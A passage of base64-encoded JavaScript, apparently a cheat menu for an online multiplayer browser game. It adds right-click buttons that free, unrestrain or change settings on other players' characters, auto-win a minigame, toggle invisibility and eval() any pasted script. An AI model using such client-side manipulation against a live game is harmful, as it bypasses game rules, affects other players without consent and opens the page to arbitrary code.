ZSBpZnJhbWUKICAgIGlmcmFtZS5vbmxvYWQgPSBmdW5jdGlvbigpIHsKICAgICAgY29uc3QgaWZyYW1lRG9jdW1lbnQgPSB0aGlzLmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQ7CiAgICAgIGlmcmFtZURvY3VtZW50Lm9wZW4oKTsKICAgICAgaWZyYW1lRG9jdW1lbnQud3JpdGUoaHRtbCk7CiAgICAgIGlmcmFtZURvY3VtZW50LmNsb3NlKCk7CiAgICB9OwoKICAgIC8vIEFwcGVuZCB0aGUgaWZyYW1lIHRvIEJDJ3MgPGJvZHk+IGVsZW1lbnQKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZyYW1lKTsKICAgIC8vIFRpbWVvdXQgdGhlIGZyYW1lCnNldFRpbWVvdXQoKCkgPT4gewogIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQoaWZyYW1lKTsKfSwgNzAwMCk7CiAgfSkKICAuY2F0Y2goZXJyb3IgPT4gewogICAgY29uc29sZS5lcnJvcignRXJyb3IgaW1wb3J0aW5nIEhUTUw6JywgZXJyb3IpOwogIH0pOwoKCi8vRW5kIE9mIExvYWRpbmcgU2NyZWVuIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgogIApmZXRjaCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDTVM3L0JDTS9tYWluL3NlcnZlcm1haW50YWluYW5jZScpCiAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogIC50aGVuKGRhdGEgPT4gewogICAgY29uc3QgcmVnZXggPSAvXGQrLzsKICAgIGNvbnN0IG1hdGNoID0gZGF0YS5tYXRjaChyZWdleCk7CiAgICBpZiAobWF0Y2ggJiYgcGFyc2VJbnQobWF0Y2hbMF0pID49IDEpIHsKICAgICAgZnVuY3Rpb24gc2hvd1RvYXN0TWFpbnQoKSB7CiAgICAgICAgLy8gVG9hc3QgY29udGFpbmVyCiAgICAgICAgdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjZjIyYzJjIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgICAgICB2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKICAgIAogICAgLy8gVXBkYXRlIHdpZHRoIG9mIHRoZSBzdGF0dXMgYmFyIGFzIGl0IGNvdW50cyBkb3duCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICB9LCAwKTsKICAgICAgICAKICAgIC8vIENyZWF0ZSB0aGUgY2xvc2UgYnV0dG9uCnZhciBjbG9zZUJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwpjbG9zZUJ1dHRvbi5zdHlsZS5ib3JkZXIgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLmJhY2tncm91bmQgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLnRvcCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5yaWdodCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250U2l6ZSA9ICIxNnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luTGVmdCA9ICItMnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luUmlnaHQgPSAiMHB4IjsKY2xvc2VCdXR0b24uaW5uZXJIVE1MID0gIlgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChjbG9zZUJ1dHRvbik7CgovLyBDbG9zZSB0aGUgdG9hc3Qgd2hlbiB0aGUgY2xvc2UgYnV0dG9uIGlzIGNsaWNrZWQKY2xvc2VCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogIH0sIDUwMCk7Cn0pOwoKICAgIC8vIEJDTSBMb2dvIEljb24KICAgIHZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICBpY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKICAgIGljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKICAgIAogICAgLy8gTWFpbnRlbmFuY2UgVGV4dAogICAgdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CiAgICB0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CiAgICB0ZXh0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMzVweCI7CiAgICB0ZXh0LmlubmVySFRNTCA9ICJCQ01FIHNlcnZlcnMgYXJlIHVuZGVyIG1haW50YWluYW5jZSwgdHJ5IGFnYWluIGxhdGVyIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwoKICAgICAgCiAgICAgICAgLy8gQXBwZW5kIHRoZSB0b2FzdCBjb250YWluZXIgdG8gQkMncyBib2R5CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CiAgICAgIAogICAgICAgIC8vIFRvYXN0J3MgZmFkZS1pbiBhbmltYXRpb24KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwogICAgICAgIH0sIDApOwogICAgICAKICAgICAgICAvLyBIaWRlIHRvYXN0IHdpdGggYSBmYWRlIG91dCBhbmltYXRpb24KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB9LCA1MDAwMDAwKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgfSwgNTUwMDAwMCk7CiAgICAgIH0gCiAgICAgIHNob3dUb2FzdE1haW50KCk7ICAgICAKICAgICAgdGhyb3cgbmV3IEVycm9yKCdFeGVjdXRpb24gc3RvcHBlZC4nKTsgLy8gc3RvcCBleGVjdXRpbmcgdGhlIHJlc3Qgb2YgdGhlIGNvZGUKICAgIH0gZWxzZSB7CgoKLy9TdGFydCBPZiBDb250ZXh0IE1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKLy9EZXNrdG9wIE1lbnVfX19fX19fX19fX19fX19fX19fX19fXwp2YXIgdmlzYiA9IHRydWU7Ci8vY29udGV4dCBNZW51CnZhciBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKLy8gRnVuY3Rpb24gdG8gY3JlYXRlIGN1c3RvbSBjb250ZXh0IG1lbnUgYnV0dG9ucwpmdW5jdGlvbiBjcmVhdGVCdXR0b24odGV4dCwgb25DbGljaykgewogICAgIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgICB2YXIgYnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBidXR0b24uaW5uZXJIVE1MID0gdGV4dDsKICAgIGJ1dHRvbi5vbmNsaWNrID0gb25DbGljazsKICAgIGJ1dHRvbi5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIGJ1dHRvbi5zdHlsZS50ZXh0QWxpZ24gPSAibGVmdCI7CiAgICBidXR0b24uc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgYnV0dG9uLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKICAgIHJldHVybiBidXR0b247Cn0KCi8vIENyZWF0ZSBzZXBhcmF0b3IgZnVuY3Rpb24KZnVuY3Rpb24gY3JlYXRlU2VwYXJhdG9yKCkgewogICAgdmFyIHNlcGFyYXRvciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImhyIik7CiAgICBzZXBhcmF0b3Iuc3R5bGUubWFyZ2luID0gIjVweCAwIjsKICAgIHJldHVybiBzZXBhcmF0b3I7Cn0KCi8vIEZ1bmN0aW9uIHRvIGRpc3BsYXkgY3VzdG9tIGNvbnRleHQgbWVudV9fX19fCmxldCBjb250ZXh0TWVudVRpbWVyID0gbnVsbDsKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY29udGV4dG1lbnUiLCBmdW5jdGlvbihldmVudCkgewogIGlmIChjb250ZXh0TWVudU9wZW4pIHsKICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgICByZXR1cm47IC8vIFByZXZlbnQgZHVwZSBtZW51cwogIH0KICBpZiAod2luZG93LmdldFNlbGVjdGlvbigpLnRvU3RyaW5nKCkgIT09ICcnKSB7CiAgICAvLyBBbGxvdyByZWd1bGFyIGNvbnRleHQgbWVudSB3aGVuIHRleHQgaXMgaGlnaGxpZ2h0ZWQKICAgIHJldHVybjsKICB9CiAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICB2YXIgY29udGV4dE1lbnUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICBjb250ZXh0TWVudS5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgY29udGV4dE1lbnUuc3R5bGUuYmFja2dyb3VuZCA9ICJsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCB3aGl0ZSwgd2hpdGUpIjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3hTaGFkb3cgPSAiMCAwIDNweCAjOTk5IjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiOHB4IjsKICBjb250ZXh0TWVudS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CiAgY29udGV4dE1lbnUuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCBibGFjayI7CiAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICBpZiAoJ29udG91Y2hzdGFydCcgaW4gd2luZG93KSB7CiAgICAvLyBIYW5kbGUgbG9uZyBwcmVzcyBvbiBtb2JpbGUgZGV2aWNlcwogICAgY29udGV4dE1lbnVUaW1lciA9IHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLnRvcCA9IGV2ZW50LnRvdWNoZXNbMF0uY2xpZW50WSArICJweCI7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLmxlZnQgPSBldmVudC50b3VjaGVzWzBdLmNsaWVudFggKyAicHgiOwogICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRleHRNZW51KTsKICAgICAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICAgIH0sIDUwMCk7CiAgfSBlbHNlIHsKICAgIC8vIEhhbmRsZSByaWdodCBjbGljayBvbiBkZXNrdG9wIGRldmljZXMKICAgIGNvbnRleHRNZW51LnN0eWxlLnRvcCA9IGV2ZW50LmNsaWVudFkgKyAicHgiOwogICAgY29udGV4dE1lbnUuc3R5bGUubGVmdCA9IGV2ZW50LmNsaWVudFggKyAicHgiOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250ZXh0TWVudSk7CiAgICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogIH0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgY2xlYXJUaW1lb3V0KGNvbnRleHRNZW51VGltZXIpOwogIH0pOwogICAgCgoKICAgIC8vIEhlYWRlciB3aXRoIEJDTSBsb2dvCiAgICB2YXIgaGVhZGVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBoZWFkZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgIGhlYWRlci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICBoZWFkZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwoKICAgIHZhciBwcm9maWxlUGhvdG8gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgIHByb2ZpbGVQaG90by5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS53aWR0aCA9ICIzMHB4IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS5oZWlnaHQgPSAiMzBweCI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjIwJSI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUubWFyZ2luUmlnaHQgPSAiMTBweCI7CgogICAgdmFyIGhlYWRlclRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGhlYWRlclRleHQuaW5uZXJIVE1MID0gIjxiPkVzc2VudGlhbHM8L2I+IjsKCiAgICBoZWFkZXIuYXBwZW5kQ2hpbGQocHJvZmlsZVBob3RvKTsKICAgIGhlYWRlci5hcHBlbmRDaGlsZChoZWFkZXJUZXh0KTsKCiAvLyBDdXN0b20gbWFpbiBidXR0b25zCiB2YXIgYnV0dG9uMSA9IGNyZWF0ZUJ1dHRvbigiUmVzdG9yZSBDaGFyYWN0ZXIiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6UGxheWVyLkFwcGVhcmFuY2UgPSBDaGF0U2VhcmNoU2FmZXdvcmRBcHBlYXJhbmNlLnNsaWNlKDApOyAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOyAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIAp9KTsKdmFyIGJ1dHRvbjIgPSBjcmVhdGVCdXR0b24oIkZvcmNlIFJvb20gU3dhcCIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyksZG9jdW1lbnRbJ2dldEVsZW1lbnRCeUlkJ10oJ0lucHV0Q2hhdCcpWydzdHlsZSddWydkaXNwbGF5J109J25vbmUnLGRvY3VtZW50WydnZXRFbGVtZW50QnlJZCddKCdUZXh0QXJlYUNoYXRMb2cnKVsnc3R5bGUnXVsnZGlzcGxheSddPSdub25lJyxDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uMyA9IGNyZWF0ZUJ1dHRvbigiRnJlZSBUYXJnZXQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6Q2hhcmFjdGVyUmVsZWFzZVRvdGFsKEN1cnJlbnRDaGFyYWN0ZXIpLENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjQgPSBjcmVhdGVCdXR0b24oIlJlbW92ZSBSZXN0cmFpbnQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5VW5sb2NrKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIEludmVudG9yeVJlbW92ZShDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBDaGF0Um9vbUNoYXJhY3Rlckl0ZW1VcGRhdGUoQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjUgPSBjcmVhdGVCdXR0b24oIlRhcmdldCBTdHJ1Z2dsZSBEaWZmaWN1bHR5IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OmRve3ZhciBkaWZjPXByb21wdCgnRGlmZmljdWx0eVx4MjAxLTk2Jyk7fXdoaWxlKCEoZGlmYz49MHgxJiZkaWZjPD0weDYwKSk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSGVhZCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgyIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQXJtcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhhbmRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTGVncyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUV5ZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1GZWV0IiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRGV2aWNlcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUFkZG9uIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVjayIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2tSZXN0cmFpbnRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVja0FjY2Vzc29yaWVzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQm9vdHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Ib29kIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTm9zZSIsIGRpZmMpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoQ3VycmVudENoYXJhY3Rlcik7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNiA9IGNyZWF0ZUJ1dHRvbigiT3BlbiBUYXJnZXQgV2FyZHJvYmUiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6RGlhbG9nQ2hhbmdlQ2xvdGhlcygpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjcgPSBjcmVhdGVCdXR0b24oIkNvbXBsZXRlIFN0cnVnZ2xlIE1pbmlnYW1lIiwgZnVuY3Rpb24oKSB7CiAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIGphdmFzY3JpcHQ6U3RydWdnbGVQcm9ncmVzcyA9MTAwMDsKICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICBEaWFsb2dMZWF2ZSgpOwogICAgfSwgNTAwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7Cgp2YXIgYnV0dG9uOCA9IGNyZWF0ZUJ1dHRvbigiSW52aXNpYmxlIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICBIZWlnaHQ6ICItIgogICAgICB9OwogICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsgCiAgICAgIHZpc2IgPSBmYWxzZTsKICAgICAgc2hvd1RvYXN0c2NwZygpOwogICAgICB1cGRhdGVDb250ZXh0TWVudSgpOyAKCiAgICAKfSk7Cgp2YXIgYnV0dG9uOSA9IGNyZWF0ZUJ1dHRvbigiVmlzaWJsZSIsIGZ1bmN0aW9uKCkgewogIGphdmFzY3JpcHQ6Q2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIHZpc2IgPSB0cnVlOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgdXBkYXRlQ29udGV4dE1lbnUoKTsgCiAgCn0pOwoKdmFyIGJ1dHRvbjEwID0gY3JlYXRlQnV0dG9uKCJDdXN0b20gU2NyaXB0IiwgZnVuY3Rpb24oKSB7CiAgamF2YXNjcmlwdDp2YXIgc2NycCA9IHByb21wdCgiUGFzdGUgeW91ciBzY3JpcHQgaGVyZToiKTsKICBpZiAoc2NycCkgewogICAgZXZhbChzY3JwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICB9Cn0pOwovLyBUcmFuc2l0aW9uIHN0eWxpbmcgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24yLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMy5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjQuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b241LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNi5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjcuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b244LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uOS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjEwLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKCgoKLy9Ib3ZlciBldmVudHMgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CiAgICB0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKICAgIHRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwogICAgfSk7CmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKICAgIHRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7CiAgICB9KTsKCmJ1dHRv